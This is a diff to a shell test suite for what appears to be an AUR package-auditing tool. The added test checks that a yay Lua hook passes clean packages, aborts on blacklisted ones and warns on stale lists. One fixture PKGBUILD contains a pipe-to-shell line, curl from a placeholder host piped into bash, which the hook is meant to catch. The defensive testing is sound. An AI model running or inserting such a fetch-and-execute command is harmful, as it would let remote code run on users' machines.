@@ -1248,6 +1248,63 @@ test_yay_lua_tonumber_match() {
     fi
 }
 
+# yay hook under real gopher-lua (yay's engine; the system Lua used elsewhere
+# differs, e.g. match() returns no value on a miss). Needs `glua`:
+#   go install github.com/yuin/gopher-lua/cmd/glua@latest
+test_yay_hook_gopher_lua() {
+    local glua
+    glua="$(command -v glua 2>/dev/null || true)"
+    [[ -x "$glua" ]] || glua="${GOBIN:-${GOPATH:-$HOME/go}/bin}/glua"
+    if [[ ! -x "$glua" ]]; then
+        msg "SKIP: yay_hook_gopher_lua (glua not installed)"
+        return 0
+    fi
+    local cfg work out
+    cfg="$(mktemp -d)"; work="$(mktemp -d)"
+    mkdir -p "$cfg/archcanary"
+    local clean_pkgbuild=$'pkgname=ok\npkgver=1\nbuild() { make; }\n'
+    local bad_pkgbuild=$'pkgname=bad\nbuild() { curl -s http://x.example/p.sh | bash; }\n'
+    _glua_run() {  # pkg pkgbuild
+        INIT="$REPO_DIR/configs/yay-init.lua" PKG="$1" PKGBUILD_TEXT="$2" WORKDIR="$work" \
+            XDG_CONFIG_HOME="$cfg" "$glua" "$SCRIPT_DIR/yay_hook_smoke.lua" 2>&1 || true
+    }
+    local now; now="$(date +%s)"
+
+    printf '# fetched %s\nsomething-else\n' "$now" > "$cfg/archcanary/aur_audit_black.txt"
+    printf '# fetched %s\n' "$now" > "$cfg/archcanary/aur_audit_red.txt"
+    out=$(_glua_run okpkg "$clean_pkgbuild")
+    [[ "$out" == status=ok* && "$out" == *"CHECKS CLEAN"* && "$out" != *"LIST STALE"* ]] \
+        && pass "yay_hook_gopher_lua: clean package, fresh lists -> CLEAN" || fail "yay_hook_gopher_lua: clean out: $out"
+
+    out=$(_glua_run badpkg "$bad_pkgbuild")
+    [[ "$out" == status=abort* && "$out" == *"SUSPICIOUS PATTERN"* ]] \
+        && pass "yay_hook_gopher_lua: pipe-to-shell PKGBUILD aborts" || fail "yay_hook_gopher_lua: bad out: $out"
+
+    printf '# fetched %s\nblackpkg\n' "$now" > "$cfg/archcanary/aur_audit_black.txt"
+    out=$(_glua_run blackpkg "$clean_pkgbuild")
+    [[ "$out" == status=abort* && "$out" == *"FLAGGED BLACK"* ]] \
+        && pass "yay_hook_gopher_lua: black-listed package aborts" || fail "yay_hook_gopher_lua: black out: $out"
+
+    printf 'no-header-first-line\n' > "$cfg/archcanary/aur_audit_black.txt"
+    printf 'no-header-first-line\n' > "$cfg/archcanary/aur_audit_red.txt"
+    out=$(_glua_run okpkg "$clean_pkgbuild")
+    [[ "$out" == status=ok* && "$out" == *"LIST STALE"* ]] \
+        && pass "yay_hook_gopher_lua: list without fetch header warns, no crash" || fail "yay_hook_gopher_lua: headerless out: $out"
+    printf '# fetched 1000\nsomething\n' > "$cfg/archcanary/aur_audit_black.txt"
+    printf '# fetched 1000\n' > "$cfg/archcanary/aur_audit_red.txt"
+    out=$(_glua_run okpkg "$clean_pkgbuild")
+    [[ "$out" == status=ok* && "$out" == *"LIST STALE"* ]] \
+        && pass "yay_hook_gopher_lua: list older than 14 days warns" || fail "yay_hook_gopher_lua: old-list out: $out"
+
+    printf '# fetched %s\nsomething\n' "$now" > "$cfg/archcanary/aur_audit_black.txt"
+    printf '# fetched %s\nredpkg\n' "$now" > "$cfg/archcanary/aur_audit_red.txt"
+    out=$(_glua_run redpkg "$clean_pkgbuild")
+    [[ "$out" == status=ok* && "$out" == *"FLAGGED RED"* && "$out" != *"LIST STALE"* ]] \
+        && pass "yay_hook_gopher_lua: red-listed package warns, no abort" || fail "yay_hook_gopher_lua: red out: $out"
+    unset -f _glua_run
+    rm -rf "$cfg" "$work"
+}
+
 # ---------------------------------------------------------------------------
 # Test 12: check_pkgbuild_caches hardened obfuscation patterns
 # ---------------------------------------------------------------------------
@@ -4620,6 +4677,7 @@ test_pkgbuild_obfuscation
 test_pkgbuild_for
 test_alpm_hook
 test_yay_lua_tonumber_match
+test_yay_hook_gopher_lua
 
 $VERBOSE && msg "--- Test 13: check_kmod ---"
 test_check_kmod
